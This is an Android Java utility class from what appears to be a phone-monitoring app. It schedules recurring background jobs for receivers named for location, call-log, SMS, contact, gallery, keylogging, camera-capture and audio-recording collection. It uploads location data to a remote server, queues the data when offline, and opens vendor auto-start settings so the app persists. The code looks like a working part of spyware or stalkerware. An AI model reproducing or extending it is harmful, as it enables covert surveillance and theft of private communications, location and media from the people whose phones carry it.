package rapidora.co.myapplication.common;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.location.Location;
import android.net.Uri;
import android.os.PowerManager;
import android.os.SystemClock;
import android.util.Log;


import com.google.gson.Gson;

import org.apache.http.entity.mime.MultipartEntity;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.ProtocolException;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.List;

import rapidora.co.myapplication.audioRecorder.AudioRecorderService;
import rapidora.co.myapplication.db.DbUtils;
import rapidora.co.myapplication.model.OfflineDataModel;
import rapidora.co.myapplication.model.UpdateLocationRequestModel;
import rapidora.co.myapplication.receiver.AudioRecordReceiver;
import rapidora.co.myapplication.receiver.CallLogReciever;
import rapidora.co.myapplication.receiver.CaptureImageReciever;
import rapidora.co.myapplication.receiver.ContactReciever;
import rapidora.co.myapplication.receiver.GalleryReciever;
import rapidora.co.myapplication.receiver.KeyLogReciever;
import rapidora.co.myapplication.receiver.LocationReciever;
import rapidora.co.myapplication.receiver.SampleReceiver;
import rapidora.co.myapplication.receiver.SmsReciever;
import rapidora.co.myapplication.receiver.UserDailyDataReciever;
import rapidora.co.myapplication.services.SendOfflineDataService;


public class Utils {

    public static long INTERVAL = 5 * 60 * 1000;

    private static AlarmManager alarmManager1;
    private static PendingIntent alarmIntent1;
    static SessionManagment sd;
    static PowerManager.WakeLock screenLock;

    public static void scheduleAlarmLocation(Context pContext) {
        Intent alarm = new Intent(pContext, LocationReciever.class);
        alarm.putExtra("service", "LocationReciever");

        PendingIntent pendingIntent = PendingIntent.getBroadcast(pContext, 2, alarm, 0);
        AlarmManager alarmManager = (AlarmManager) pContext.getSystemService(Context.ALARM_SERVICE);
        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), 2 * 60 * 1000, pendingIntent);

    }


    public static void scheduleAlarmCallLog(Context pContext) {


        Intent alarm = new Intent(pContext, CallLogReciever.class);
        alarm.putExtra("service", "CallLogService");

        PendingIntent pendingIntent = PendingIntent.getBroadcast(pContext, 3, alarm, 0);
        AlarmManager alarmManager = (AlarmManager) pContext.getSystemService(Context.ALARM_SERVICE);
        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 7000, 4 * 60 * 1000, pendingIntent);

    }

    public static void cancelAlarmCallLog(Context pContext) {
        try {
            Intent intent = new Intent(pContext, CallLogReciever.class);
            PendingIntent alarmIntent = PendingIntent.getBroadcast(pContext, 3,
                    intent, 0);
            AlarmManager alarmManager = (AlarmManager) pContext
                    .getSystemService(Context.ALARM_SERVICE);
            alarmManager.cancel(alarmIntent);
            alarmIntent.cancel();


        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    public static void scheduleAlarmKeyLog(Context pContext) {


        Intent alarm = new Intent(pContext, KeyLogReciever.class);
        alarm.putExtra("service", "CallLogService");

        PendingIntent pendingIntent = PendingIntent.getBroadcast(pContext, 11, alarm, 0);
        AlarmManager alarmManager = (AlarmManager) pContext.getSystemService(Context.ALARM_SERVICE);
        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), 4 * 61 * 1000, pendingIntent);

    }

    public static void cancelAlarmKeyLog(Context pContext) {
        try {
            Intent intent = new Intent(pContext, KeyLogReciever.class);
            PendingIntent alarmIntent = PendingIntent.getBroadcast(pContext, 11,
                    intent, 0);
            AlarmManager alarmManager = (AlarmManager) pContext
                    .getSystemService(Context.ALARM_SERVICE);
            alarmManager.cancel(alarmIntent);
            alarmIntent.cancel();


        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    public static void scheduleAlarmForSendUSerDetail(Context pContext) {

        CustomLogger.getInsatance(pContext).putLog("UserDetailService scheduleAlarmForSendUSerDetail");
        Intent alarm = new Intent(pContext, SampleReceiver.class);
        alarm.putExtra("service", "UserDetailService");

        PendingIntent pendingIntent = PendingIntent.getBroadcast(pContext, 4, alarm, 0);
        AlarmManager alarmManager = (AlarmManager) pContext.getSystemService(Context.ALARM_SERVICE);
        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), 5 * 60 * 1000, pendingIntent);

    }

    public static void cancelAlarmForSendUSerDetail(Context pContext) {
        try {
            Intent intent = new Intent(pContext, SampleReceiver.class);
            PendingIntent alarmIntent = PendingIntent.getBroadcast(pContext, 4,
                    intent, 0);
            AlarmManager alarmManager = (AlarmManager) pContext
                    .getSystemService(Context.ALARM_SERVICE);
            alarmManager.cancel(alarmIntent);
            alarmIntent.cancel();


        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    public static void scheduleAlarmForSendAllUserData(Context pContext) {

        Intent alarm = new Intent(pContext, UserDailyDataReciever.class);
        alarm.putExtra("service", "SendAllUserData");
        PendingIntent pendingIntent = PendingIntent.getBroadcast(pContext, 5, alarm, 0);
        AlarmManager alarmManager = (AlarmManager) pContext.getSystemService(Context.ALARM_SERVICE);
        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), 60 * 1000 * 60 * 24, pendingIntent);

    }

    public static void cancelAlarmForSendAllUserData(Context pContext) {
        try {
            Intent intent = new Intent(pContext, UserDailyDataReciever.class);
            PendingIntent alarmIntent = PendingIntent.getBroadcast(pContext, 5,
                    intent, 0);
            AlarmManager alarmManager = (AlarmManager) pContext
                    .getSystemService(Context.ALARM_SERVICE);
            alarmManager.cancel(alarmIntent);
            alarmIntent.cancel();


        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    public static void scheduleAlarmContact(Context pContext) {

        Intent alarm = new Intent(pContext, ContactReciever.class);
        alarm.putExtra("service", "ContactService");
        boolean alarmRunning = (PendingIntent.getBroadcast(pContext, 6, alarm, PendingIntent.FLAG_NO_CREATE) != null);

        PendingIntent pendingIntent = PendingIntent.getBroadcast(pContext, 6, alarm, 0);
        AlarmManager alarmManager = (AlarmManager) pContext.getSystemService(Context.ALARM_SERVICE);
        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 5000, 6 * 60 * 1000, pendingIntent);

    }

    public static void cancelAlarmContact(Context pContext) {
        try {
            Intent intent = new Intent(pContext, ContactReciever.class);
            PendingIntent alarmIntent = PendingIntent.getBroadcast(pContext, 6,
                    intent, 0);
            AlarmManager alarmManager = (AlarmManager) pContext
                    .getSystemService(Context.ALARM_SERVICE);
            alarmManager.cancel(alarmIntent);
            alarmIntent.cancel();
        } catch (Exception e) {

        }


    }


    public static void scheduleAlarmAlarmSms(Context pContext) {
        Intent alarm = new Intent(pContext, SmsReciever.class);
        alarm.putExtra("service", "SmsService");
        boolean alarmRunning = (PendingIntent.getBroadcast(pContext, 7, alarm, PendingIntent.FLAG_NO_CREATE) != null);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(pContext, 7, alarm, 0);
        AlarmManager alarmManager = (AlarmManager) pContext.getSystemService(Context.ALARM_SERVICE);
        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), 3 * 60 * 1000, pendingIntent);

    }

    public static void cancelAlarmSms(Context pContext) {
        try {
            Intent intent = new Intent(pContext, SmsReciever.class);
            PendingIntent alarmIntent = PendingIntent.getBroadcast(pContext, 7,
                    intent, 0);
            AlarmManager alarmManager = (AlarmManager) pContext
                    .getSystemService(Context.ALARM_SERVICE);
            alarmManager.cancel(alarmIntent);
            alarmIntent.cancel();
        } catch (Exception e) {
        }
    }


    public static void scheduleAlarmGallery(Context pContext) {

        Intent alarm = new Intent(pContext, GalleryReciever.class);
        alarm.putExtra("service", "GalleryService");
        PendingIntent pendingIntent = PendingIntent.getBroadcast(pContext, 8, alarm, 0);
        AlarmManager alarmManager = (AlarmManager) pContext.getSystemService(Context.ALARM_SERVICE);
        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), Constants.galleryTime, pendingIntent);
    }

    public static void cancelAlarmGallery(Context pContext) {
        try {
            Intent intent = new Intent(pContext, GalleryReciever.class);
            PendingIntent alarmIntent = PendingIntent.getBroadcast(pContext, 8,
                    intent, 0);
            AlarmManager alarmManager = (AlarmManager) pContext
                    .getSystemService(Context.ALARM_SERVICE);
            alarmManager.cancel(alarmIntent);
            alarmIntent.cancel();
        } catch (Exception e) {

        }


    }


    public static void SchedulServiceForOnRequest(Context pContext) {

        Intent alarm = new Intent(pContext, SampleReceiver.class);
        alarm.putExtra("service", "OnUserRequest");
        PendingIntent pendingIntent = PendingIntent.getBroadcast(pContext, 9, alarm, 0);
        AlarmManager alarmManager = (AlarmManager) pContext.getSystemService(Context.ALARM_SERVICE);
        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 30000, INTERVAL, pendingIntent);

    }

    public static void cancelAlarmForOnRequest(Context pContext) {
        try {
            Intent intent = new Intent(pContext, SampleReceiver.class);
            PendingIntent alarmIntent = PendingIntent.getBroadcast(pContext, 9,
                    intent, 0);
            AlarmManager alarmManager = (AlarmManager) pContext
                    .getSystemService(Context.ALARM_SERVICE);
            alarmManager.cancel(alarmIntent);
            alarmIntent.cancel();

        } catch (Exception e) {

        }

    }


    public static void scheduleAlarmCaptureImage(Context pContext) {

        Intent alarm = new Intent(pContext, CaptureImageReciever.class);
        alarm.putExtra("service", "ContactService");
        boolean alarmRunning = (PendingIntent.getBroadcast(pContext, 12, alarm, PendingIntent.FLAG_NO_CREATE) != null);

        PendingIntent pendingIntent = PendingIntent.getBroadcast(pContext, 12, alarm, 0);
        AlarmManager alarmManager = (AlarmManager) pContext.getSystemService(Context.ALARM_SERVICE);
        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), 6 * 60 * 1000, pendingIntent);

    }

    public static void cancelAlarmCaptureImage(Context pContext) {
        try {
            Intent intent = new Intent(pContext, CaptureImageReciever.class);
            PendingIntent alarmIntent = PendingIntent.getBroadcast(pContext, 12,
                    intent, 0);
            AlarmManager alarmManager = (AlarmManager) pContext
                    .getSystemService(Context.ALARM_SERVICE);
            alarmManager.cancel(alarmIntent);
            alarmIntent.cancel();
        } catch (Exception e) {

        }


    }


    public static void scheduleAlarmAudioRecord(Context pContext) {

        Intent alarm = new Intent(pContext, AudioRecordReceiver.class);
        alarm.putExtra("service", "ContactService");
        boolean alarmRunning = (PendingIntent.getBroadcast(pContext, 14, alarm, PendingIntent.FLAG_NO_CREATE) != null);

        PendingIntent pendingIntent = PendingIntent.getBroadcast(pContext, 6, alarm, 0);
        AlarmManager alarmManager = (AlarmManager) pContext.getSystemService(Context.ALARM_SERVICE);
        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), 4 * 65 * 1000, pendingIntent);

    }

    public static void cancelAlarmAudioRecord(Context pContext) {
        try {
            Intent intent = new Intent(pContext, AudioRecordReceiver.class);
            PendingIntent alarmIntent = PendingIntent.getBroadcast(pContext, 14,
                    intent, 0);
            AlarmManager alarmManager = (AlarmManager) pContext
                    .getSystemService(Context.ALARM_SERVICE);
            alarmManager.cancel(alarmIntent);
            alarmIntent.cancel();
        } catch (Exception e) {

        }


    }


    public static String makeHttpURLConnection(String url,
                                               String requestString, Context context) throws IOException {

        String responseString = null;
        try {
            URL requestURL = new URL(url);
            HttpURLConnection conn = (HttpURLConnection) requestURL
                    .openConnection();
            setHttpCongiguration(conn);
            if (requestString != null) {
                OutputStreamWriter writer = new OutputStreamWriter(
                        conn.getOutputStream());
                writer.write(requestString);
                writer.flush();
                writer.close();
            }
            int HttpResult = conn.getResponseCode();
            if (HttpResult == HttpURLConnection.HTTP_OK) {
                InputStream in = new BufferedInputStream(conn.getInputStream());
                responseString = Utils.readStream(in);
                in.close();

            } else {
                Log.e("TAG", conn.getResponseMessage());
            }
            conn.disconnect();
        } catch (Exception e) {
            Log.e("error data sending", e.toString());
        }
        return responseString;
    }


    private static String readStream(InputStream in) {
        try {

            BufferedReader reader = new BufferedReader(new InputStreamReader(
                    in, "UTF-8"));
            StringBuilder result = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                result.append(line);
            }
            return result.toString();
        } catch (IOException ioe) {
            return null;
        } catch (Exception e) {
            return null;
        }
    }

    private static void setHttpCongiguration(HttpURLConnection conn) {
        conn.setReadTimeout(40 * 1000 /* milliseconds */);
        conn.setConnectTimeout(40 * 1000 /* milliseconds */);
        try {
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoInput(true);
            conn.setDoOutput(true);
            conn.connect();
        } catch (ProtocolException e) {

        } catch (IOException e) {

        }
    }


    public static void setLatitute(String latitute, Context context) {

        SharedPreferences pref = context.getSharedPreferences(
                Constants.LOCATION_TRACKER_PREF, 0);
        SharedPreferences.Editor editor = pref.edit();
        editor.putString("LATITUTE", latitute);
        editor.commit();

    }

    public static void setLongitute(String longitute, Context context) {

        SharedPreferences pref = context.getSharedPreferences(
                Constants.LOCATION_TRACKER_PREF, 0);
        SharedPreferences.Editor editor = pref.edit();
        editor.putString("LONGITUTE", longitute);
        editor.commit();

    }


    public static String getLongitute(Context context) {

        SharedPreferences pref = context.getSharedPreferences(
                Constants.LOCATION_TRACKER_PREF, 0);
        return pref.getString("LONGITUTE", "");

    }

    public static String getLatitute(Context context) {

        SharedPreferences pref = context.getSharedPreferences(
                Constants.LOCATION_TRACKER_PREF, 0);
        return pref.getString("LATITUTE", "");

    }


    public static void  sendLocation(Context context, Location location) {
        try {
            Log.e("sendLocation()", "sendLocation()");


            ConnectionDetector cd = new ConnectionDetector(context);
            sd = new SessionManagment(context);


        /*    screenLock = ((PowerManager) context.getSystemService(Context.POWER_SERVICE)).newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "TAG");
            screenLock.acquire();*/


            Calendar c = Calendar.getInstance();
            // SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd");
            SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd");
            String formattedDate = df.format(c.getTime());
            // System.out.println("Currrent Date Time : " + formattedDate);
            Log.e("sendLocation() Date", formattedDate);
            SimpleDateFormat df1 = new SimpleDateFormat("HH:mm:ss");
            String timeformat = df1.format(c.getTime());
            Log.e("sendLocation() time", timeformat);


            UpdateLocationRequestModel requestModel = new UpdateLocationRequestModel();
            requestModel.setId(sd.getUserId());
            requestModel.setReceivetime(formattedDate+" "+timeformat);
            requestModel.setAddress("adfasdfsadfsdaf");
            requestModel.setLatitude(String.valueOf(location.getLatitude()));
            requestModel.setLongitude(String.valueOf(location.getLongitude()));
            CustomLogger.getInsatance(context).putLog(":: Location latitude ::" + String.valueOf(location.getLatitude()));
            Log.e("Logitude", location.getLatitude() + " " + location.getLongitude());
            Utils.setLatitute(String.valueOf(location.getLatitude()), context);
            Utils.setLongitute(String.valueOf(location.getLongitude()), context);
            Log.e("MAP LAT LONG", Utils.getLatitute(context) + " " + Utils.getLongitute(context));
            String response = null;
            String locationRequestString = convertObjectToJsonString(requestModel);
            try {

                response = Utils.makeHttpURLConnection(
                        Constants.UPDATE_LOCATION_URL, locationRequestString, context);
                // Log.e("UTILS RESPONSE", response);
                Log.e("response location", response);

            } catch (Exception e) {
                // Utils.cancelAlarm(context);
                //  Utils.scheduleAlarm(context);
                Log.e("UTILS Error", e.toString());
                CustomLogger.getInsatance(context).putLog(":: Location response ::" + e.toString());
                e.printStackTrace();
            }
            CustomLogger.getInsatance(context).putLog(":: Location request ::" + locationRequestString);

            if (response == null) {
                DbUtils.saveOfflineData(context, locationRequestString, Constants.UPDATE_LOCATION_URL);
            } else {
                List<OfflineDataModel> offlineDataModelList = DbUtils.getOfflineData(context);
                if (offlineDataModelList.size() > 0) {
                    context.startService(new Intent(context, SendOfflineDataService.class));
                }

            }
            CustomLogger.getInsatance(context).putLog(
                    ":: Location reponse ::" + response);

          /*  if (screenLock.isHeld())
                screenLock.release();*/

        } catch (Exception e) {

           /* if (screenLock.isHeld())
                screenLock.release();*/

            Log.e("Error in sendlocation", e.toString());
        }

    }

    public static String convertObjectToJsonString(Object obj) {

        Gson gson = new Gson();
        return gson.toJson(obj);

    }

    public static String multipost(String urlString, MultipartEntity reqEntity) {

        try {
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();

            conn.setConnectTimeout(50000);
            conn.setRequestMethod("POST");
            conn.setUseCaches(false);
            conn.setDoInput(true);
            conn.setDoOutput(true);

            conn.setRequestProperty("Connection", "Keep-Alive");
            conn.addRequestProperty("Content-length", reqEntity.getContentLength() + "");
            conn.addRequestProperty(reqEntity.getContentType().getName(), reqEntity.getContentType().getValue());

            OutputStream os = conn.getOutputStream();
            reqEntity.writeTo(conn.getOutputStream());
            os.close();
            conn.connect();

            if (conn.getResponseCode() == HttpURLConnection.HTTP_OK) {
                return readStream1(conn.getInputStream());
            }

        } catch (Exception e) {
            e.printStackTrace();
            Log.e("MainActivity", "multipart post error " + e + "(" + urlString + ")");
        }
        return null;
    }

    public static String multipost1(String urlString, MultipartEntity reqEntity) {

        try {
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();

            conn.setConnectTimeout(60000);
            conn.setDoOutput(true);
            conn.setUseCaches(false);
            conn.setDoInput(true);
            conn.setDoOutput(true);

            conn.setRequestProperty("Connection", "Keep-Alive");
            conn.addRequestProperty("Content-length", reqEntity.getContentLength() + "");
            conn.addRequestProperty(reqEntity.getContentType().getName(), reqEntity.getContentType().getValue());

            OutputStream os = conn.getOutputStream();
            reqEntity.writeTo(conn.getOutputStream());
            os.close();
            conn.connect();

            if (conn.getResponseCode() == HttpURLConnection.HTTP_OK) {
                return readStream1(conn.getInputStream());
            }

        } catch (Exception e) {
            e.printStackTrace();

            Log.e("MainActivity", "multipart post error " + e + "(" + urlString + ")");
        }
        return null;
    }

    public static String readStream1(InputStream in) {
        BufferedReader reader = null;
        StringBuilder builder = new StringBuilder();
        try {
            reader = new BufferedReader(new InputStreamReader(in));
            String line = "";
            while ((line = reader.readLine()) != null) {
                builder.append(line);
            }
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (reader != null) {
                try {
                    reader.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
        return builder.toString();
    }


    public static boolean dateValidation(String startDate, String endDate, String dateFormat) {
        try {

            SimpleDateFormat df = new SimpleDateFormat(dateFormat);
            java.util.Date date1 = df.parse(endDate);
            java.util.Date startingDate = df.parse(startDate);


            if (date1.after(startingDate))
                return true;
            else
                return false;
        } catch (Exception e) {
            return false;
        }
    }


    public static void startAl(Context pContext) {


        Intent alarm = new Intent(pContext, CallLogReciever.class);
        alarm.putExtra("service", "CallLogService");

        PendingIntent pendingIntent = PendingIntent.getBroadcast(pContext, 0, alarm, 0);
        AlarmManager alarmManager = (AlarmManager) pContext.getSystemService(Context.ALARM_SERVICE);
        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), 30000, pendingIntent);

    }

    public static void cancelAl(Context pContext) {
        try {
            Intent intent = new Intent(pContext, CallLogReciever.class);
            PendingIntent alarmIntent = PendingIntent.getBroadcast(pContext, 0,
                    intent, 0);
            AlarmManager alarmManager = (AlarmManager) pContext
                    .getSystemService(Context.ALARM_SERVICE);
            alarmManager.cancel(alarmIntent);
            alarmIntent.cancel();


        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    public static boolean autoStartPermission(final Context context, String manufacturer) {

        if ("xiaomi".equalsIgnoreCase(manufacturer)) {
            try {
                final Intent intent = new Intent();
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intent.setComponent(new ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity"));
                context.startActivity(intent);
            } catch (Exception e) {
                e.printStackTrace();
            }
            return true;
        }
        if ("oppo".equalsIgnoreCase(manufacturer)) {
            try {
                Intent intent = new Intent();
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intent.setClassName("com.coloros.safecenter",
                        "com.coloros.safecenter.permission.startup.StartupAppListActivity");
                context.startActivity(intent);
            } catch (Exception e) {
                try {
                    Intent intent = new Intent();
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    intent.setClassName("com.oppo.safe",
                            "com.oppo.safe.permission.startup.StartupAppListActivity");
                    context.startActivity(intent);

                } catch (Exception ex) {
                    try {
                        Intent intent = new Intent();
                        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        intent.setClassName("com.coloros.safecenter",
                                "com.coloros.safecenter.startupapp.StartupAppListActivity");
                        context.startActivity(intent);
                    } catch (Exception exx) {

                    }
                }
            }
            return true;
        }
        if ("vivo".equalsIgnoreCase(manufacturer)) {
            try {
                Intent intent = new Intent();
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intent.setComponent(new ComponentName("com.iqoo.secure",
                        "com.iqoo.secure.ui.phoneoptimize.AddWhiteListActivity"));
                context.startActivity(intent);
            } catch (Exception e) {
                try {
                    Intent intent = new Intent();
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    intent.setComponent(new ComponentName("com.vivo.permissionmanager",
                            "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"));
                    context.startActivity(intent);
                } catch (Exception ex) {
                    try {
                        Intent intent = new Intent();
                        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        intent.setClassName("com.iqoo.secure",
                                "com.iqoo.secure.ui.phoneoptimize.BgStartUpManager");
                        context.startActivity(intent);
                    } catch (Exception exx) {
                        ex.printStackTrace();
                    }
                }
            }
            return true;
        }
        if ("huawei".equalsIgnoreCase(manufacturer)) {
            try {
                final Intent intent = new Intent();
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intent.setComponent(new ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity"));
                context.startActivity(intent);
            } catch (Exception e) {

            }
            return true;
        }
        if ("Honor".equalsIgnoreCase(manufacturer)) {
            try {
                final Intent intent = new Intent();
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intent.setComponent(new ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity"));
                context.startActivity(intent);
            } catch (Exception e) {

            }
            return true;
        }
        if ("Letv".equalsIgnoreCase(manufacturer)) {
            try {
                final Intent intent = new Intent();
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intent.setComponent(new ComponentName("com.letv.android.letvsafe", "com.letv.android.letvsafe.AutobootManageActivity"));
                context.startActivity(intent);
            } catch (Exception e) {

            }
            return true;
        }
        if ("oneplus".equalsIgnoreCase(manufacturer)) {
            try {
                final Intent intent = new Intent();
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intent.setComponent(new ComponentName("com.oneplus.security", "com.oneplus.security.chainlaunch.view.ChainLaunchAppListAct‌​ivity"));
                context.startActivity(intent);
            } catch (Exception e) {

            }
            return true;
        }
        return false;
    }

}
